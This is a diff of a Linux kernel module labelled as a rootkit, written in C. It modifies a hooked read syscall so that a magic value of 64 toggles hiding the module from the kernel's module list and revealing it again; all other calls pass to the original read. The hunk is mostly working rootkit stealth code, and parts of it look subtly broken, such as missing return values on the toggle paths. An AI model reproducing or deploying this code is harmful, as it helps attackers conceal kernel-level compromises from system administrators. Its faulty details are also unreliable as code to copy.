@@ -100,14 +100,28 @@ void hideme(void) {
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
 }
-asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
-    int sig = regs->si;
-    static struct list_head *prev_module;
+void showme(void) {
+    list_add(&THIS_MODULE->list, prev_module);
+}
 
-    if (sig == 0) {
-        printk(KERN_INFO "sneaky_sys_read\n");
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+    static short hidden = 0;
+
+    void showme(void);
+    void hideme(void);
+
+    int sig = regs->si;
+
+    if ((sig == 64) && (hidden == 0)) {
+        printk(KERN_INFO "rootkit: hiding rootkit!\n");
         hideme();
-    }
+        hidden = 1;
+    } else if ((sig == 64) && (hidden == 1)) {
+        printk(KERN_INFO "rootkit: revealing rootkit!\n");
+        showme();
+        hidden = 0;
+    } else
+        return original_read(regs);
 }
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
